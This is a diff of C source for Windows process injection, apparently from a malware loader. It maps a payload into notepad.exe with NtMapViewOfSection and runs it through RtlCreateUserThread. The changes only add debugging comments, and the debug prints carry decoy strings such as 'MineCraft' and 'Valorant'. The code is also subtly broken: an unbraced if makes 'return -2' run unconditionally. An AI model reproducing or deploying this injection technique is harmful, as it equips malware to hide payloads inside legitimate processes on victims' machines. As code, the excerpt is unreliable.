@@ -209,19 +209,21 @@ int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) 
 	
 	// create remote section view (target process)
 	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
-
+	//for debugging (remove in prod)
 	printf("MineCraft: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
 	
 
 	// execute the payload
 	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
 	if (pRtlCreateUserThread == NULL)
+		//for debugging (remove in prod)
 		printf("failed");
 		return -2;
 	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
 	if (hThread != NULL) {
 			WaitForSingleObject(hThread, 500);
 			CloseHandle(hThread);
+			//for debugging (remove in prod)
 			printf("Valorant");
 			return 0;
 	}
@@ -235,10 +237,11 @@ int main(void) {
     
 	int pid = 0;
     HANDLE hProc = NULL;
-
+	//Process to inject into
 	pid = FindTarget("notepad.exe");
-
+	
 	if (pid) {
+		//for debugging (remove in prod)
 		printf("Notepad.exe PID = %d\n", pid);
 
 		// try to open target process
